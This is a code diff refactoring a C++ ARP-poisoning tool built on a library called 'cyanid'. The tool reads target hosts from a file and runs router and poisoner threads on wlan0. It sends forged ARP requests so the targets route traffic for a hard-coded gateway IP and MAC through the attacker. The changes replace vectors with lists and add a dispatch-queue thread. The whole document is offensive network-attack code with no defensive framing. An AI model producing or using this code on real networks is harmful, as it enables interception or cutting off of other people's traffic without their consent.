@@ -8,15 +8,15 @@
 #include <iostream>
 #include <fstream>
 #include <string>
-#include <vector>
+#include <list>
 #include <thread>
 
 using namespace std;
 using namespace cyanid;
 
-void trigger_poisoning(cyanid::device&, const vector<string>&);
-void read_hosts(vector<string>&, const string&);
-void dump_hosts(const vector<string>&);
+void trigger_poisoning(cyanid::device&, const list<string>&);
+void read_hosts(list<string>&, const string&);
+void dump_hosts(const list<string>&);
 
 int main(int argc, char* argv[])
 {
@@ -25,9 +25,9 @@ int main(int argc, char* argv[])
 
     const string iface("wlan0");
     const string gateway_ip("192.168.1.1");
-    const string gateway_mac("00:1e:2a:0b:74:16");
+    const string gateway_mac("00:1b:2f:0a:ca:70");
 
-    vector<string> hosts;
+    list<string> hosts;
     read_hosts(hosts, "hosts.txt");
 
     cout << "Starting ARP poisoning and routing on " << iface << "... ";
@@ -35,7 +35,10 @@ int main(int argc, char* argv[])
     device dev(iface);
 
     BasicFilter filter(hosts);
-    thread router(Router(dev, filter));
+    DispatchQueue dq(dev, gateway_ip);
+
+    thread dispatch_queue([&dq]() { dq.run(); });
+    thread router(Router(dev, filter, dq));
     thread poisoner(Poisoner(dev, hosts, gateway_ip, gateway_mac));
 
     cout << "Done. Firewalling hosts: " << endl;
@@ -46,6 +49,7 @@ int main(int argc, char* argv[])
 
     trigger_poisoning(dev, hosts);
 
+    dispatch_queue.join();
     router.join();
     poisoner.join();
 
@@ -55,12 +59,12 @@ int main(int argc, char* argv[])
 /**
  * Trigger ARP poisoning by sending ARP requests to the target hosts.
  */
-void trigger_poisoning(cyanid::device& dev, const vector<string>& hosts)
+void trigger_poisoning(cyanid::device& dev, const list<string>& hosts)
 {
     const std::string source_mac(cyanid::utils::mac_to_str(dev.get_mac()));
     const std::string source_ip(cyanid::utils::addr4_to_str(dev.get_ip()));
 
-    for (auto it = hosts.begin(); it < hosts.end(); ++it) {
+    for (auto it = hosts.begin(); it != hosts.end(); ++it) {
         const string target_ip(*it);
 
         cyanid::packet packet(dev);
@@ -82,7 +86,7 @@ void trigger_poisoning(cyanid::device& dev, const vector<string>& hosts)
     }
 }
 
-void read_hosts(vector<string>& hosts, const string& file)
+void read_hosts(list<string>& hosts, const string& file)
 {
     string line;
 
@@ -93,7 +97,7 @@ void read_hosts(vector<string>& hosts, const string& file)
     }
 }
 
-void dump_hosts(const vector<string>& hosts)
+void dump_hosts(const list<string>& hosts)
 {
     for (auto it = hosts.begin(); it != hosts.end(); ++it) {
         cout << "<*> " << *it << endl;
